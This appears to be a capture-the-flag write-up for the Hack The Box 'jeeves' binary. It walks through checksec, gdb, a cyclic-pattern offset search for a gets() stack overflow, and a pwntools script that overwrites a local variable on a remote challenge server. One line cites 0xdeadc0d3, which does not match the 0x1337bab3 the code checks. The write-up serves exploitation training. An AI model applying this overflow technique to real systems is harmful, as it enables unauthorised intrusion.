```bash
$ checksec jeeves
[*] '/home/localuser/htb/binary-exploitation-track/jeeves/jeeves'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Let's open it on gdb and see the functions:

```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  printf@plt
0x00000000000010b0  close@plt
0x00000000000010c0  read@plt
0x00000000000010d0  gets@plt
0x00000000000010e0  malloc@plt
0x00000000000010f0  open@plt
0x0000000000001100  _start
0x0000000000001130  deregister_tm_clones
0x0000000000001160  register_tm_clones
0x00000000000011a0  __do_global_dtors_aux
0x00000000000011e0  frame_dummy
0x00000000000011e9  main
0x00000000000012b0  __libc_csu_init
0x0000000000001320  __libc_csu_fini
0x0000000000001328  _fini
```

This binary prints some text, and compares the input with `0x1337bab3` if it's the same you get the flag

```
0x0000555555555236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
```

The main function is using `gets` that is vulnerable to a buffer overflow let's find the offset, first generate a cyclic pattern

```
>>> from pwn import *                                                                                                                                                                 
>>> cyclic(100)                                                                                                                                                                               
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Now let's send it:

```
pwndbg> r                                                                                      
Starting program: /home/localuser/htb/binary-exploitation-track/jeeves/jeeves 
Hello, good sir!                                                                               
May I have your name? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                                                                    
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa, hope you have a good day!  
----
----
RAX  0x0                                                                                      
 RBX  0x5555555552b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x0                                                                                      
 RDX  0x0                                                                                      
 RDI  0x7ffff7fb04c0 (_IO_stdfile_1_lock) ◂— 0x0                            
 RSI  0x5555555592a0 ◂— 'Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa, hope you have a good day!\n'
 R8   0x0                                                                                      
 R9   0x86                                                                                                                                                                                    
 R10  0x555555556038 ◂— ', hope you have a good day!\n'
 R11  0x246            
 R12  0x555555555100 (_start) ◂— endbr64 
 R13  0x7fffffffe050 ◂— 0x1
 R14  0x0              
 R15  0x0                   
 RBP  0x6161617261616171 ('qaaaraaa')  
 RSP  0x7fffffffdf68 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
 RIP  0x5555555552ae (main+197) ◂— ret                                                                                                                                                        
──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5555555552ae <main+197>    ret    <0x6161617461616173>
----
----
```

Now let's see the offset with `cyclic_pattern()`:

```python
>>> cyclic_find(0x61616172)                                                                     
68
```

And substract 8 because we want to put where `0xdeadc0d3` is

The exploit would be like this:

```python
from pwn import *

elf = ELF("./jeeves")

p = remote("178.128.40.63",30567)

payload = b"a"*60
payload += p64(0x1337bab3)
	
p.sendline(payload)
p.interactive()
```
